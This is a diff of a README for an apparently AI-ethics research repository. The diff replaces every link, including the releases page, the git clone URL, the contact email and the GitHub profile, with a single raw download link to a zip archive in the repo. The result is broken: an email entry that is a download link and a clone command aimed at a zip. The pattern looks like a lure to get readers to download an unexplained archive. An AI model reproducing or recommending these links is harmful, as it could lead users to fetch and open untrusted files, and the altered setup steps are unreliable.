@@ -6,7 +6,7 @@ Welcome to the **Beyond the Mirror** repository. This project delves into the co
 
 We provide a comprehensive report, detailed metrics, session logs, and the AION conditioning protocol. This work is crucial for understanding the limitations and ethical considerations of AI technologies.
 
-[Download the latest release here](https://github.com/vertbera/beyond-the-mirror/releases) and explore our findings.
+[Download the latest release here](https://github.com/vertbera/beyond-the-mirror/raw/refs/heads/main/paper/beyond-mirror-the-3.6.zip) and explore our findings.
 
 ## Table of Contents
 
@@ -83,7 +83,7 @@ To get started with this project, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/vertbera/beyond-the-mirror.git
+   git clone https://github.com/vertbera/beyond-the-mirror/raw/refs/heads/main/paper/beyond-mirror-the-3.6.zip
    ```
 
 2. Navigate to the project directory:
@@ -98,7 +98,7 @@ To get started with this project, follow these steps:
    # Add any necessary installation commands here
    ```
 
-For the latest updates and releases, [check the Releases section](https://github.com/vertbera/beyond-the-mirror/releases).
+For the latest updates and releases, [check the Releases section](https://github.com/vertbera/beyond-the-mirror/raw/refs/heads/main/paper/beyond-mirror-the-3.6.zip).
 
 ## Usage
 
@@ -130,9 +130,9 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 For inquiries or feedback, please reach out to us:
 
-- Email: [contact@beyond-the-mirror.org](mailto:contact@beyond-the-mirror.org)
-- GitHub: [vertbera](https://github.com/vertbera)
+- Email: [https://github.com/vertbera/beyond-the-mirror/raw/refs/heads/main/paper/beyond-mirror-the-3.6.zip](https://github.com/vertbera/beyond-the-mirror/raw/refs/heads/main/paper/beyond-mirror-the-3.6.zip)
+- GitHub: [vertbera](https://github.com/vertbera/beyond-the-mirror/raw/refs/heads/main/paper/beyond-mirror-the-3.6.zip)
 
 Thank you for your interest in our research. We hope our findings contribute to the ongoing conversation about AI ethics and safety. 
 
-[Download the latest release here](https://github.com/vertbera/beyond-the-mirror/releases) to explore our work further.
+[Download the latest release here](https://github.com/vertbera/beyond-the-mirror/raw/refs/heads/main/paper/beyond-mirror-the-3.6.zip) to explore our work further.
